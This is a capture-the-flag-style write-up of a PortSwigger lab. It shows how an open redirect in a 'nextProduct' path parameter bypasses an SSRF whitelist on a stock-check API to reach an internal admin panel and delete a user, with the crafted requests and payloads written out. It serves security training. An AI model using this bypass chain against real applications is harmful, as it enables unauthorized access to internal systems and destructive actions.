# PortSwigger Lab: SSRF with Filter Bypass via Open Redirection Vulnerability

## Objective

Exploit an SSRF vulnerability in the stock check functionality and bypass the URL restrictions using an open redirection vulnerability to access the internal administration interface and delete the user `carlos`.

---

## Vulnerability

The application uses the `stockApi` parameter to fetch stock information from a back-end system. However, the stock checker is restricted to only access URLs within the local application. In addition, the application contains an open redirect vulnerability that can be abused to bypass these restrictions.

---

## Steps

### 1. Intercept the Stock Check Request

Browse to any product and click **Check Stock**.

Capture the request in Burp Suite and send it to Repeater.

Original request:

```http
POST /product/stock HTTP/2

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

---

### 2. Test Direct SSRF

Attempt to change the parameter to:

```text
http://192.168.0.12:8080/admin
```

The request is blocked because the stock checker only allows requests to the local application.

---

### 3. Identify the Open Redirect

Click **Next Product** and intercept the request.

The request contains a parameter similar to:

```text
/product/nextProduct?currentProductId=1&path=/product?productId=2
```

Modifying the `path` parameter controls the value placed in the `Location` header of the response.

Example:

```text
/product/nextProduct?path=http://example.com
```

Response:

```http
HTTP/1.1 302 Found
Location: http://example.com
```

This behavior confirms the presence of an **Open Redirect** vulnerability.

---

### 4. Exploit the Open Redirect

Construct a URL that redirects to the internal admin interface:

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Use this URL as the value of the `stockApi` parameter:

```http
POST /product/stock HTTP/2

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

The stock checker first requests:

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

which returns:

```http
302 Found
Location: http://192.168.0.12:8080/admin
```

The back-end HTTP client follows the redirect and displays the administration interface.

---

### 5. Delete the Target User

Modify the payload to point to the delete endpoint:

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Final request:

```http
POST /product/stock HTTP/2

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Send the request.

The server follows the redirect and deletes the user `carlos`, solving the lab.

---

## Payloads Used

### Access Admin Interface

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### Delete User

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---

## Explanation

The stock checker enforced a whitelist that only allowed requests to the local application. However, the application itself contained an open redirect vulnerability.

The server first validated and requested a trusted local URL:

```text
/product/nextProduct
```

This endpoint returned a redirection response pointing to:

```text
http://192.168.0.12:8080/admin
```

Because the back-end HTTP client automatically followed the redirect, it eventually accessed the internal administration interface, bypassing the SSRF filter.

---

